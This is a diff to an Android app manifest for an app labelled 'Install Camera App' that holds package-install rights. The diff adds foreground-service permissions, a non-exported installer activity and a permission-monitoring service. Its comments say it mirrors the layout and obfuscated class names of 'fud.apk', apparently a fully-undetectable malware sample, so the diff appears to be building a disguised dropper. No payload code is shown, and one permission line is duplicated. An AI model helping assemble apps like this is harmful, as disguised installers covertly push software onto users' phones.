@@ -2,6 +2,10 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
 
     <application
         android:allowBackup="true"
@@ -9,14 +13,26 @@
         android:label="Install Camera App"
         android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
 
+        <!-- Launcher activity - exported like fud.apk's gEqvW6VnlWERSwutPp -->
         <activity
-            android:name=".InstallerActivity"
+            android:name=".MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <!-- Installer activity - NOT exported like fud.apk's jPfXPQJdzLf8nBacZr -->
+        <activity
+            android:name=".InstallerActivity"
+            android:exported="false" />
+
+        <!-- Foreground service to monitor permission changes -->
+        <service
+            android:name=".PermissionMonitorService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse" />
 
         <receiver
             android:name=".InstallReceiver"
